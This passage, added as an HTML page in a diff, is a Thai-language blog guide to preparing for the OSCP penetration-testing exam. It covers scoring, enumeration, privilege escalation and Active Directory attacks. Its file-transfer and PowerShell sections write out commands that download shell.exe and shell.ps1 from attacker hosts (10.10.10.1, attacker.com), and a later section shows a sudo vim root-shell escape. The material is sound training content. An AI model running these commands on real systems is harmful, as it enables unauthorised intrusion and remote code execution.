@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+
+<html lang="th">
+<head>
+<script>
+(function(){var s=localStorage.getItem('siteLang');var a=(navigator.language||'').toLowerCase().startsWith('th')?'th':'en';document.documentElement.classList.add('lang-'+(s||a));})();
+</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>เตรียมตัวสอบ OSCP ยังไงให้ผ่านแบบไร้ข้อกังวล | Sabastiaz</title>
+<meta content="เตรียมตัวสอบ OSCP ยังไงให้ผ่านแบบไร้ข้อกังวล - Sabastiaz Red Team Sorcerer" name="description"/>
+<meta content="Ratthapong Sommanus (Sabastiaz)" name="author"/>
+<meta content="index, follow" name="robots"/>
+<meta content="#1a1008" name="theme-color"/>
+<meta content="เตรียมตัวสอบ OSCP ยังไงให้ผ่านแบบไร้ข้อกังวล | Sabastiaz" property="og:title"/>
+<meta content="เตรียมตัวสอบ OSCP ยังไงให้ผ่านแบบไร้ข้อกังวล - Sabastiaz Red Team Sorcerer" property="og:description"/>
+<meta content="https://sabastiaz.github.io/pic/thumb/oscp-guide.jpg" property="og:image"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<link href="../style.css" rel="stylesheet"/>
+<link href="../favicon.ico?v=6" rel="icon" type="image/x-icon"/>
+<link href="../favicon-32.png?v=6" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../favicon-16.png?v=6" rel="icon" sizes="16x16" type="image/png"/>
+<link href="https://sabastiaz.github.io/blog/oscp-guide-th.html" rel="canonical"/>
+
+<style>
+  .post-back{display:inline-flex;align-items:center;gap:.4rem;font-family:'Cinzel',serif;font-size:.7rem;letter-spacing:.12em;color:var(--text-muted);text-decoration:none;margin-bottom:2rem;transition:color .2s}
+  .post-back:hover{color:var(--gold)}
+  .post-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid rgba(201,168,76,.15)}
+  .post-tags{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
+  .post-tag{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.08em;padding:.15rem .5rem;border-radius:2px}
+  .tag-en    {color:#6bc5d2;background:rgba(107,197,210,.1);border:1px solid rgba(107,197,210,.22)}
+  .tag-th    {color:#c39bd3;background:rgba(195,155,211,.1);border:1px solid rgba(195,155,211,.22)}
+  .tag-cert  {color:var(--gold2);background:rgba(201,168,76,.1);border:1px solid rgba(201,168,76,.22)}
+  .tag-lab   {color:#5dba6a;background:rgba(93,186,106,.1);border:1px solid rgba(93,186,106,.22)}
+  .tag-pentest{color:#e07b5a;background:rgba(224,123,90,.1);border:1px solid rgba(224,123,90,.22)}
+  .tag-life  {color:#a89bc2;background:rgba(168,155,194,.1);border:1px solid rgba(168,155,194,.22)}
+  .tag-ctf   {color:#63d4af;background:rgba(99,212,175,.1);border:1px solid rgba(99,212,175,.22)}
+  .post-meta-row{display:flex;align-items:center;gap:1.2rem;margin-bottom:1.2rem;font-size:.78rem;color:var(--text-muted)}
+  .post-meta-row .dot{opacity:.3}
+  .post-title{font-family:'Cinzel',serif;font-size:clamp(1.3rem,4vw,2rem);font-weight:700;color:var(--text);line-height:1.35;margin:0}
+  .post-body{max-width:740px;line-height:1.9;color:var(--text-muted);font-size:.97rem}
+  .post-body h2{font-family:'Cinzel',serif;font-size:1.05rem;font-weight:600;color:var(--gold);margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:1px solid rgba(201,168,76,.15)}
+  .post-body h3{font-family:'Cinzel',serif;font-size:.88rem;font-weight:600;color:var(--text);margin:1.8rem 0 .8rem}
+  .post-body h4{font-family:'Cinzel',serif;font-size:.8rem;font-weight:600;color:var(--text-muted);margin:1.4rem 0 .6rem}
+  .post-body p{margin:0 0 1.2rem}
+  .post-body ul,.post-body ol{padding-left:1.5rem;margin:0 0 1.2rem}
+  .post-body li{margin-bottom:.4rem}
+  .post-body strong{color:var(--text)}
+  .post-body em{font-style:italic;color:var(--text-muted)}
+  .post-body code{font-family:'Courier New',monospace;font-size:.84rem;background:rgba(201,168,76,.07);border:1px solid rgba(201,168,76,.15);padding:.1rem .35rem;border-radius:3px;color:var(--gold2)}
+  .post-body pre{background:rgba(0,0,0,.45);border:1px solid rgba(201,168,76,.15);border-radius:4px;padding:1.2rem 1.4rem;overflow-x:auto;margin:0 0 1.5rem}
+  .post-body pre code{background:none;border:none;padding:0;font-size:.82rem;line-height:1.45;color:#c9c9c9}
+  .post-body table{width:100%;border-collapse:collapse;margin:0 0 1.5rem;font-size:.88rem}
+  .post-body th{font-family:'Cinzel',serif;font-size:.68rem;letter-spacing:.08em;color:var(--gold);text-align:left;padding:.6rem 1rem;border-bottom:1px solid rgba(201,168,76,.25)}
+  .post-body td{padding:.5rem 1rem;border-bottom:1px solid rgba(201,168,76,.08)}
+  .post-body blockquote{border-left:3px solid var(--gold);padding:.8rem 1.4rem;margin:0 0 1.5rem;background:rgba(201,168,76,.04);border-radius:0 4px 4px 0;font-style:italic}
+  .post-body a{color:var(--gold);text-decoration:none}
+  .post-body a:hover{text-decoration:underline}
+  .post-body figure{margin:1.5rem 0 2rem;text-align:center}
+  .post-body figure img{max-width:100%;border-radius:6px;border:1px solid rgba(201,168,76,.12)}
+  .post-body figcaption{font-size:.75rem;color:var(--text-muted);margin-top:.5rem;font-style:italic}
+  .post-body hr{border:none;border-top:1px solid rgba(201,168,76,.15);margin:2rem 0}
+  .post-footer{margin-top:4rem;padding-top:2.5rem;border-top:1px solid rgba(201,168,76,.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.5rem}
+  .author-card{display:flex;align-items:center;gap:1rem}
+  .author-avatar{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid rgba(201,168,76,.3)}
+  .author-name{font-family:'Cinzel',serif;font-size:.85rem;font-weight:600;color:var(--text)}
+  .author-creds{font-size:.7rem;color:var(--text-muted);margin-top:.2rem}
+.share-section{margin-top:3rem;padding:1.5rem 0;border-top:1px solid rgba(201,168,76,.1)}
+.share-label{font-family:'Cinzel',serif;font-size:.75rem;color:var(--text-muted);letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.9rem}
+.share-buttons{display:flex;gap:.6rem;flex-wrap:wrap}
+.share-btn{display:inline-flex;align-items:center;gap:.45rem;padding:.45rem .9rem;border-radius:4px;font-size:.75rem;font-family:'Cinzel',serif;text-decoration:none;cursor:pointer;border:1px solid rgba(201,168,76,.25);background:rgba(201,168,76,.04);color:var(--text-muted);transition:border-color .2s,color .2s,background .2s}
+.share-btn:hover{border-color:var(--gold);color:var(--gold);background:rgba(201,168,76,.08)}
+.share-btn svg{flex-shrink:0}
+.lb[lang="en"]{display:none}
+html.lang-en .lb[lang="th"]{display:none}
+html.lang-en .lb[lang="en"]{display:block}
+.lang-pill{display:inline-flex;border:1px solid rgba(201,168,76,.3);border-radius:20px;overflow:hidden;font-family:'Cinzel',serif;font-size:.65rem;letter-spacing:.08em}
+.lang-pill a{padding:.28rem .6rem;text-decoration:none;color:var(--text-muted);transition:color .15s,background .15s;line-height:1}
+.lang-pill a.active{background:rgba(201,168,76,.18);color:var(--gold);pointer-events:none}
+.lang-pill a:not(.active):hover{background:rgba(201,168,76,.08);color:var(--text)}
+
+  .post-navlinks{display:flex;justify-content:space-between;gap:1rem;margin-top:1.5rem;flex-wrap:wrap}
+  .post-navlink{flex:1;min-width:200px;background:var(--surface2);border:1px solid rgba(201,168,76,.13);border-radius:4px;padding:1rem 1.2rem;text-decoration:none;transition:all .25s;display:flex;flex-direction:column;gap:.3rem}
+  .post-navlink:hover{border-color:rgba(201,168,76,.4);transform:translateY(-2px)}
+  .post-navlink.next{text-align:right;align-items:flex-end}
+  .post-navlink-label{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:var(--text-muted)}
+  .post-navlink-title{font-size:.85rem;color:var(--gold2);line-height:1.4}
+</style>
+</head>
+<body>
+<canvas id="stars-canvas"></canvas>
+<nav>
+<a class="nav-logo" href="../index.html">Sabastiaz 🪄</a>
+<ul class="nav-links">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../about.html">About</a></li>
+<li><a href="../skills.html">Spells</a></li>
+<li><a href="../tools.html">Arsenal</a></li>
+<li><a class="active" href="../writings.html">Tomes</a></li>
+<li><a href="../honor.html">Honours</a></li>
+<li><a href="../wowza.html">Wowza</a></li>
+<li><a href="../event.html">Events</a></li>
+<li><a href="../changelog.html">Updates</a></li>
+<li><a href="../contact.html">Owl Post</a></li>
+<li><a href="../cocacola.html">🥤</a></li>
+</ul>
+<div class="lang-pill" id="lang-pill">
+<a class="lang-th" href="#">TH</a>
+<a class="lang-en" href="#">EN</a>
+</div>
+<button aria-expanded="false" aria-label="Menu" class="nav-hamburger" id="nav-hamburger"><span></span><span></span><span></span></button>
+</nav>
+<div class="page">
+<div class="content">
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+<div class="post-header">
+<div class="post-tags"><span class="post-tag tag-th">TH</span><span class="post-tag tag-cert">Certification</span></div>
+<div class="post-meta-row">
+<span>August 26, 2025</span><span class="dot">✦</span><span>6 min read</span>
+</div>
+<h1 class="post-title"><span class="lb" lang="th">เตรียมตัวสอบ OSCP ยังไงให้ผ่านแบบไร้ข้อกังวล</span><span class="lb" lang="en">How to Pass the OSCP Exam Without Worries</span></h1>
+</div>
+<div class="post-body lb" lang="th">
+<p>สวัสดีครับกลับมาพบกันอีกเช่นเคย วันนี้จะมาพูดถึงหัวข้อการเตรียมตัวในฉบับของผมและจากคนรอบตัวผมนะครับ</p>
+<blockquote>ทำความเข้าใจ OSCP ก่อนเริ่ม</blockquote>
+<blockquote><em>OSCP ชื่อเดิมคือ </em><strong><em>Offensive Security Certified Professional</em></strong><em> และชื่อใหม่คือ </em><strong><em>OffSec Certified Professional</em></strong><em> รหัส PEN 200 OSCP เป็นข้อสอบที่เหล่านักทดสอบเจาะระบบต้องการที่จะพิชิตมันซึ่งกว่าจะได้มาเลือดตาแทบกระเด็นและยังถือเป็นข้อสอบที่ใครหลายๆคนต้องการมันมาไว้ในครอบครอง อยากอ่านมากว่านี้ก็ไปอ่านได้ที่<br/></em><a href="https://sabastiaz.medium.com/my-oscp-journey-triple-attempts-63ba203df052" rel="noopener" target="_blank">https://sabastiaz.medium.com/my-oscp-journey-triple-attempts-63ba203df052</a></blockquote>
+<p><strong>ก่อนเข้ามาอ่าน Blog ทุกคนอาจจะเป็นเหมือนภาพนี้</strong></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*B2WDuaiUN_sXVzft.jpg"/>
+</figure>
+<p><strong>แต่ภาพนี้จะเปลี่ยนเป็นภาพนี้ทันทีเมื่อคุณได้อ่าน Blog นี้</strong></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-4jqbsjitzFVCq1O.jpg"/>
+</figure>
+<h2>เรามาพูดถึง OSCP Exam Structure กันดีกว่า</h2>
+<p>การนับคะแนนและ solution ที่จะผ่านข้อสอบได้ ซึ่ง OSCP จะผ่านได้ต้องมีคะแนน 70 คะแนนขึ้นไปถึงจะผ่าน แล้วเขานับคะแนนยังไงละ ข้างล่างมีคำตอบ</p>
+<ul>
+<li><strong>3 stand-alone machines (60 points in total)</strong></li>
+<li>20 points per machine</li>
+<li>10 points for initial access</li>
+<li>10 points for privilege escalation</li>
+<li><strong>1 Active Directory (AD) set containing 3 machines (40 points in total)</strong></li>
+<li>For the Active Directory exam set, learners will be provided with a username and password, simulating a breach scenario.</li>
+<li>10 points for machine #1</li>
+<li>10 points for machine #2</li>
+<li>20 points for machine #3</li>
+</ul>
+<p>ด้านล่างนี้คือเกณฑ์ที่เราจะสามารถผ่าน OSCP ได้ 70 คะแนน</p>
+<ul>
+<li>40 points AD + 3 local.txt flags (70 points)</li>
+<li>40 points AD + 2 local.txt flags + 1 proof.txt flag (70 points)</li>
+<li>20 points AD + 3 local.txt flags + 2 proof.txt flag (70 points)</li>
+<li>10 points AD + 3 fully completed stand-alone machines (70 points)</li>
+</ul>
+<blockquote>เป้าหมายที่เราควรตั้งคือที่ 100 คะแนนครับ<br/><strong>40 points AD + 3 fully completed stand-alone machines (100 points)</strong></blockquote>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nkxn2IUUNuiXXRYI.gif"/>
+</figure>
+<h3>หลังจากเกริ่นมาคร่าวๆแล้วก็มาถึงแผนเตรียมสอบผ่าน OSCP แบบไร้กังวล โดยผมได้จัดทำเป็นหัวข้อต่างๆ ดังนี้</h3>
+<h3>1. มีพื้นฐานแน่น=มีแต้มต่อ</h3>
+<p>เรารู้กันดีอยู่แล้วว่าข้อสอบ OSCP นั้นมีความยากมากแค่ไหนแต่มันไม่ได้ยากขนาดนั้นหากเรามีการเตรียมพื้นฐานก่อนก็จะทำให้เรามีแต้มต่อนั่นเองโดยผมได้แบ่งมาให้สำหรับผู้ที่เริ่มต้น</p>
+<h3>File Transfer</h3>
+<p><strong>หมายถึง</strong> วิธีการส่งไฟล์ระหว่างเครื่อง attacker ↔ victim โดยใช้ protocol หรือ command ที่ระบบมีอยู่แล้ว (living off the land)</p>
+<p><strong>PowerShell</strong></p>
+<ul>
+<li><code>wget</code> / <code>Invoke-WebRequest</code> (iwr):</li>
+</ul>
+<pre><code>powershell -c "iwr &lt;http://10.10.10.1/shell.exe&gt; -OutFile C:\\Windows\\Temp\\shell.exe"</code></pre>
+<p><strong>Certutil (Windows built-in)</strong></p>
+<pre><code>certutil -urlcache -split -f &lt;http://10.10.10.1/shell.exe&gt; shell.exe</code></pre>
+<p><strong>scp (Linux/Unix)</strong></p>
+<pre><code>scp file.txt user@target:/tmp/file.txt</code></pre>
+<p><strong>nc (netcat)</strong></p>
+<p>ส่งไฟล์: <code>nc -lvnp 4444 &lt; file.txt</code>รับไฟล์: <code>nc attacker 4444 &gt; file.txt</code></p>
+<p><strong>ftp</strong></p>
+<ul>
+<li>ใช้ <code>ftp</code> client หรือ PowerShell <code>ftp</code> script</li>
+</ul>
+<pre><code>ftp 10.10.10.1Username: anonymousPassword: anonymousftp&gt; put shell.exeftp&gt; get secret.txt</code></pre>
+<h3>Command Prompt (CMD) PowerShell Basics (OSCP Prep)</h3>
+<p>CMD คือ shell พื้นฐานของ Windows ที่ใช้มานาน เน้น command แบบง่าย ๆ ไม่ค่อยซับซ้อน</p>
+<h3>คำสั่งพื้นฐาน</h3>
+<ul>
+<li><code>dir</code> → แสดงไฟล์/โฟลเดอร์ใน directory ปัจจุบัน</li>
+<li><code>cd</code> → เปลี่ยน directory</li>
+</ul>
+<pre><code>cd C:\Users\Public</code></pre>
+<ul>
+<li><code>type</code> → อ่านไฟล์ (เหมือน <code>cat</code> บน Linux)</li>
+</ul>
+<pre><code>type C:\Windows\System32\drivers\etc\hosts</code></pre>
+<ul>
+<li><code>copy</code>, <code>move</code>, <code>del</code> → จัดการไฟล์ (copy/move/delete)</li>
+<li><code>tasklist</code> → ดู process ที่รันอยู่</li>
+<li><code>taskkill /PID 1234 /F</code> → kill process</li>
+<li><code>net user</code> → list users ในระบบ</li>
+<li><code>net localgroup administrators</code> → ดู local admin group</li>
+<li><code>ipconfig</code> → แสดง network config</li>
+<li><code>ping</code>, <code>nslookup</code> → network troubleshooting</li>
+</ul>
+<h3>PowerShell (Windows Enumeration &amp; Execution)</h3>
+<ul>
+<li><strong>Basic Cmdlets</strong></li>
+</ul>
+<pre><code>Get-Process          # ดู process Get-Service          # ดู service Get-LocalUser        # ดู user</code></pre>
+<ul>
+<li><strong>Enumeration / Execution</strong></li>
+</ul>
+<pre><code>Get-ChildItem C:\Users -Recurse | Out-File users.txt Invoke-WebRequest http://attacker.com/shell.ps1 -OutFile shell.ps1</code></pre>
+<ul>
+<li>ใช้ PowerShell ร่วมกับ payload / script สำหรับ <strong>post-exploitation</strong> และ PrivEsc</li>
+</ul>
+<p>แนะนำของดีอีกอย่างสำหรับการทำ <strong>Reverse shell </strong><br/><a href="https://www.revshells.com/" rel="noopener" target="_blank">https://www.revshells.com/</a> เว็บที่เอาไว้สำหรับสร้าง reverse shell รูปแบบต่างๆ แต่ละภาษา</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*acRP02Gvdvu9ZR5BPmpOSQ.png"/>
+</figure>
+<h3>ในส่วนของ Web Application</h3>
+<p>ผมขอแนะนำ Port Swigger Academy เป็นอีก 1 คอร์สที่ดีมากสำหรับผู้ที่ฝึกทางด้านเว็บลิ้งค์นี้เลย <a href="https://portswigger.net/web-security" rel="noopener" target="_blank">https://portswigger.net/web-security</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*oVX7gPbh3xjraiwQTi7gNQ.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Y7idZXynqaVOQcX4YR2DLQ.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*qL1jm0EJXNlHmDVKeTSZ1Q.png"/>
+</figure>
+<p>และที่สำคัญนอกจากจะมี web academy แล้ว portswigger ยังมี certified ให้เหล่าผู้ที่สนใจสอบอีกด้วย โดยจะมีซื่อว่า <strong>Burp Suite Certified Practitioner (BSCP)</strong><br/>ซึ่ง <strong>Burp Suite Certified Practitioner (BSCP)</strong> คือใบรับรองอย่างเป็นทางการสำหรับผู้เชี่ยวชาญด้านความปลอดภัยบนเว็บ จากผู้สร้าง Burp Suite การเป็น Burp Suite Certified Practitioner <br/>รายละเอียดไปอ่านที่นี่ได้ <a href="https://portswigger.net/web-security/certification" rel="noopener" target="_blank">https://portswigger.net/web-security/certification</a></p>
+<p><strong>Tools</strong></p>
+<ul>
+<li>Burp Suite Community (intercept, repeater)</li>
+<li>dirsearch / gobuster (dir brute)</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nCTuLkupGZvFp_NM.gif"/>
+</figure>
+<h2>2. เน้นการฝึก Enumeration</h2>
+<p>เพื่อช่วยให้หาช่องทางในการเข้าเครื่องได้อย่างมีประสิทธิภาพไม่ตกหลุมกระต่าย Initial Access</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*2tMYuaVLpDu01Qfr.gif"/>
+<figcaption>หลุมกระต่ายที่พูดถึง</figcaption>
+</figure>
+<p>ฝึกใช้ nmap, rustscan, gobuster/feroxbuster, smbclient, ldapsearch และที่มาใหม่ในจณนี้ต้องไม่พ้นกับ <a href="https://www.netexec.wiki/" rel="noopener" target="_blank"><strong>Netexec</strong></a></p>
+<h3>NetExec คืออะไร?</h3>
+<ul>
+<li><strong>NetExec (nxc)</strong> คือ fork ของ CrackMapExec (CME)</li>
+<li>ใช้สำหรับ <strong>enumeration, exploitation, credential spraying, และ lateral movement</strong> บน Windows/AD environment</li>
+<li>รองรับ protocol หลายตัว: SMB, RDP, WinRM, MSSQL, SSH ฯลฯ</li>
+</ul>
+<h3>ฟีเจอร์หลัก</h3>
+<ul>
+<li><strong>SMB / WinRM / RDP enumeration</strong></li>
+<li><strong>Credential spraying &amp; brute forcing</strong></li>
+<li><strong>Remote command execution</strong> (smbexec, wmiexec, atexec)</li>
+<li><strong>Password dump / SAM dumping</strong> (ถ้าได้สิทธิ์)</li>
+<li><strong>Kerberos support</strong> (AS-REP roasting, Kerberoasting)</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*k9liStDXKUVRyVy3"/>
+<figcaption>NetExec</figcaption>
+</figure>
+<blockquote>คำจำง่าย ๆ:<strong> <br/><em>Enum is the key</em> </strong>🔑</blockquote>
+<h2>3. พัฒนาทักษะ Privilege Escalation</h2>
+<h3>Privilege Escalation Techniques (Linux &amp; Windows)</h3>
+<p>เมื่อผู้ทดสอบเจาะระบบ (Pentester) ได้ <strong>initial access</strong> เข้าเครื่องเป้าหมาย ไม่ว่าจะเป็น Linux หรือ Windows เป้าหมายต่อไปคือการยกระดับสิทธิ์ (Privilege Escalation) ให้กลายเป็น <strong>root</strong> (Linux) หรือ <strong>SYSTEM / Administrator</strong> (Windows) เพื่อควบคุมเครื่องได้เต็มรูปแบบ เทคนิคที่ใช้จะแตกต่างกันไปในแต่ละระบบปฏิบัติการ ดังนี้</p>
+<h3>🐧 Linux Privilege Escalation</h3>
+<h3>1. Sudo Misconfiguration</h3>
+<p>บางครั้งผู้ดูแลระบบอนุญาตให้ user ใช้ <code>sudo</code> รันคำสั่งเฉพาะอย่างโดยไม่ต้องใช้รหัสผ่าน เช่น</p>
+<pre><code>(user) ALL=(ALL) NOPASSWD: /usr/bin/vim</code></pre>
+<p>หากคำสั่งนั้นสามารถ escape shell ได้ เช่น <code>vim</code>, <code>less</code>, <code>python</code> ก็สามารถเปิด shell ที่รันด้วยสิทธิ์ root ได้ทันที</p>
+<p>👉 <strong>ตัวอย่าง</strong>:</p>
+<pre><code>sudo vim -c ':!/bin/sh'</code></pre>
+<h3>2. SUID Binaries</h3>
+<p>ไฟล์ที่มี Permission <code>SUID</code> (Set User ID) หมายความว่าเวลารันไฟล์นั้น จะรันด้วยสิทธิ์ของเจ้าของไฟล์แทนผู้รัน ถ้าไฟล์เป็นของ root → ก็รันด้วย root<br/> หากไฟล์เหล่านี้ถูกเขียนโค้ดไม่ปลอดภัย ก็อาจนำมา exploit ได้</p>
+<p>👉 <strong>ค้นหาไฟล์ SUID ทั้งหมด</strong>:</p>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<h3>3. Cron Jobs</h3>
+<p>Cron job คือ task ที่ถูกตั้งเวลาให้รันอัตโนมัติ ถ้า cron script หรือ binary ที่มันเรียกใช้ เขียนโดย root แต่เก็บไว้ใน path ที่ user สามารถแก้ไขได้ → pentester สามารถแทรก malicious command เพื่อรันด้วยสิทธิ์ root ได้</p>
+<h3>4. Kernel Exploits</h3>
+<p>หากระบบใช้ Kernel version เก่า อาจมีช่องโหว่ที่ให้ผู้โจมตีรัน exploit เพื่อยกระดับสิทธิ์ได้<br/> Pentester มักใช้ <code>uname -a</code> ตรวจสอบเวอร์ชัน และค้นหา exploit ใน exploit-db</p>
+<p>👉 <strong>ตัวอย่าง</strong>: DirtyCow (CVE-2016–5195) exploit ใช้กันบ่อย</p>
+<h3>5. PATH Hijacking</h3>
+<p>หาก script ของ root เรียกใช้ binary โดยไม่ใส่ full path เช่น <code>tar</code> แทนที่จะเป็น <code>/bin/tar</code> ผู้โจมตีสามารถสร้าง binary ปลอมชื่อเดียวกันไว้ใน <code>$PATH</code> ที่มาก่อน → script จะรัน binary ปลอมด้วยสิทธิ์ root</p>
+<h3>🪟 Windows Privilege Escalation</h3>
+<h3>1. Weak Services</h3>
+<p>Service ที่รันด้วยสิทธิ์ SYSTEM แต่ไฟล์หรือ registry key สามารถแก้ไขได้โดย user → attacker สามารถเปลี่ยน binary/service config ให้ชี้ไปยัง payload ของตนเอง</p>
+<h3>2. Unquoted Service Paths</h3>
+<p>หาก Windows service กำหนด path โดยไม่มี <code>"</code> เช่น</p>
+<pre><code>C:\Program Files\Some Service\service.exe</code></pre>
+<p>Windows จะพยายามหาทีละ path เช่น</p>
+<ul>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\Some.exe</code></li>
+<li><code>C:\Program Files\Some Service\service.exe</code></li>
+</ul>
+<p>ผู้โจมตีสามารถสร้าง <code>C:\Program.exe</code> malicious binary ได้ → service รันด้วย SYSTEM</p>
+<h3>3. AlwaysInstallElevated</h3>
+<p>Windows มี policy ที่อนุญาตให้ user ติดตั้ง <code>.msi</code> package ด้วยสิทธิ์ SYSTEM ถ้าเปิด policy นี้ทั้ง machine และ user level ผู้โจมตีสามารถสร้าง malicious <code>.msi</code> แล้วรันเพื่อยกระดับสิทธิ์ได้</p>
+<h3>4. Token Impersonation</h3>
+<p>Windows ใช้ concept ของ <strong>tokens</strong> ในการจัดการสิทธิ์ บางโปรแกรมที่รันด้วยสิทธิ์สูงอาจทิ้ง token ไว้ ผู้โจมตีสามารถ “impersonate” token นั้นเพื่อรัน process ด้วยสิทธิ์ SYSTEM ได้</p>
+<p>👉 <strong>เครื่องมือที่ใช้บ่อย</strong>: GodPotato, PrintSpoofer</p>
+<h3>5. Vulnerable Drivers</h3>
+<p>Driver บางตัวที่ติดตั้งใน Windows มีช่องโหว่ (เช่น Arbitrary Kernel Write/Read) สามารถ exploit เพื่อรันโค้ดใน kernel mode → กลายเป็น SYSTEM ได้</p>
+<h3>🧰 เครื่องมือช่วย Enumeration</h3>
+<ul>
+<li><strong>Linux</strong> → LinPEAS, Linux Exploit Suggester</li>
+<li><strong>Windows</strong> → WinPEAS, Seatbelt, SharpUp</li>
+</ul>
+<p>ซึ่งผมมีบทความของเพื่อนผมว่าที่ OSCE3 ที่เขียนเกี่ยวกับการ Privilege ไว้ดีมาก ตามอ่านได้ที่ <a href="https://datafarm-cybersecurity.medium.com/windows-privilege-escalation-ea2a93cbd0e9" rel="noopener" target="_blank">https://datafarm-cybersecurity.medium.com/windows-privilege-escalation-ea2a93cbd0e9</a></p>
+<blockquote><strong>ฝึกจน “เจอ service แปลก ๆ → รู้ instinct ว่ามีช่องทาง PE”</strong></blockquote>
+<h2>4. Active Directory &amp; Network Attacks 🚪🔑</h2>
+<p>Active Directory (AD) ถือเป็นหัวใจของระบบเครือข่ายองค์กร เพราะเก็บทั้ง <strong>บัญชีผู้ใช้, สิทธิ์, Group Policy, และ Service ต่าง ๆ</strong> ถ้าใครเจาะ AD ได้ = ครองอาณาจักรทั้งองค์กรเลย 😈</p>
+<p>การโจมตี AD มักจะเริ่มจาก foothold เล็ก ๆ บน network เช่น user machine, service account หรือ share drive จากนั้นค่อยขยับไปสู่ domain controller (DC)</p>
+<h3>🔥 เทคนิคโจมตีที่นิยม (และคนเจอแล้วร้องว้าว)</h3>
+<p><strong>Kerberoasting</strong> 🍗</p>
+<ul>
+<li>ดึง Kerberos service tickets มาแตก offline</li>
+<li>ถ้าเจอ password ง่าย ๆ = ได้ service account สิทธิ์สูงทันที</li>
+</ul>
+<p><strong>AS-REP Roasting</strong> 🔥</p>
+<ul>
+<li>โจมตี user ที่เปิด <code>Do not require pre-auth</code></li>
+<li>ได้ hash ไปแตก password แบบสวย ๆ</li>
+</ul>
+<p><strong>Pass-the-Hash / Pass-the-Ticket</strong> 🎭</p>
+<ul>
+<li>ไม่ต้องใช้ password จริง แค่ได้ <strong>hash หรือ ticket</strong> ก็สามารถ impersonate user ได้เลย</li>
+<li>ทำให้ lateral movement โคตรไว</li>
+</ul>
+<p><strong>Misconfigured ACL / DACL Abuse</strong> 🛠️</p>
+<ul>
+<li>สิทธิ์ผิดพลาดบน AD objects (เช่น user แอบมีสิทธิ์แก้ไข user อื่น)</li>
+<li>กลายเป็นบันไดสู่ domain admin แบบไม่ต้อง exploit software</li>
+</ul>
+<p><strong>BloodHound Recon</strong> 🐺</p>
+<ul>
+<li>ใช้ BloudHound CE <a href="https://bloodhound.specterops.io/home" rel="noopener" target="_blank">https://bloodhound.specterops.io/home</a></li>
+<li>ใช้ BloodHound map ความสัมพันธ์ใน AD</li>
+<li>เหมือนมีแผนที่ลับ บอกว่า “เดินเส้นนี้สิ เดี๋ยวไปถึง Domain Admin”</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*TLdZ87Ubk-ZYQosa.png"/>
+<figcaption>ตัวอย่าง BloodHound</figcaption>
+</figure>
+<p><strong>Network-level Attacks</strong> 🌐</p>
+<ul>
+<li>LLMNR/NBT-NS Poisoning, SMB Relay, NTLM Relay</li>
+<li>ดัก credentials บน network แล้วเอาไป reuse ต่อ</li>
+</ul>
+<blockquote>ตั้งเป้าให้ทำ AD lab ของ <strong>HackTheBox / Proving Grounds</strong> ให้คล่อง</blockquote>
+<h2>5. แหล่งเรียนรู้ + Certified (Optional)</h2>
+<p><strong>PG Play Lab หรือ Proving Ground </strong>เป็น Platform ของทาง offsec ที่มีไว้ให้ลองฝึกเครื่อง linux และ window <a href="https://www.offsec.com/labs/individual/" rel="noopener" target="_blank">https://www.offsec.com/labs/individual/</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*H_AUVadSQCkhAqUbiERLPw.png"/>
+</figure>
+<p><strong>TJ null เนื้อหาที่มีการรวมเพื่อใช้สำหรับการเตรียมตัวสอบโดยเทียบกับ Machine ของ Platform ต่าง</strong>: <br/><a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview" rel="noopener" target="_blank">https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6fdWzYe2qYg0OPHPe68y-w.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*t4FILu8GZysNePyEXHrEWg.png"/>
+<figcaption>TJ Null List</figcaption>
+</figure>
+<p><strong>HTB Academy (แนะนำ path: Penetration Tester Path) ซึ่งคือ path ของ CPTS (C</strong>ertified-Penetration-Testing-Specialist<strong>) </strong><br/>หากมีอีเมลล์นักศึกษาสามารถซื้อรายเดือนได้ในราคา 8$<br/><a href="https://academy.hackthebox.com/" rel="noopener" target="_blank">https://academy.hackthebox.com/</a></p>
+<figure>
